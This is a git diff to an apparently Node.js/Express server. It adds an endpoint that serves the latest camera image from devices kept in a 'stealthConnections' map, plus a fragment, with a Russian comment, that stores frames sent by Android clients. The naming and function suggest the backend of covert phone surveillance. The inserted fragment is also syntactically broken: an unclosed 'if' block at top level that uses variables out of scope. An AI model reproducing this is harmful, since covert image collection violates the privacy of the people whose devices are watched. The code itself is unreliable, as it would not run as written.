@@ -376,6 +376,29 @@ app.get("/api/device/:deviceId/:token", async (req, res) => {
   }
 });
 
+app.get('/api/device/:deviceId/latest-image', (req, res) => {
+  const deviceId = req.params.deviceId;
+  const deviceInfo = stealthConnections.get(deviceId);
+  
+  if (deviceInfo && deviceInfo.latestImage) {
+    res.json({
+      success: true,
+      image: deviceInfo.latestImage,
+      timestamp: deviceInfo.latestImageTime
+    });
+  } else {
+    res.json({ success: false, message: 'No image available' });
+  }
+});
+
+// В обработчике WebSocket от Android сохраняйте последний кадр:
+if (msg.type === 'image') {
+  const deviceInfo = stealthConnections.get(deviceId);
+  if (deviceInfo) {
+    deviceInfo.latestImage = msg.data;
+    deviceInfo.latestImageTime = Date.now();
+  }
+
 app.get("/", (req, res) => {
   res.sendFile("index.html", { root: "public" });
 });
@@ -429,6 +452,7 @@ function getDistance(lat1, lon1, lat2, lon2) {
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
 
 
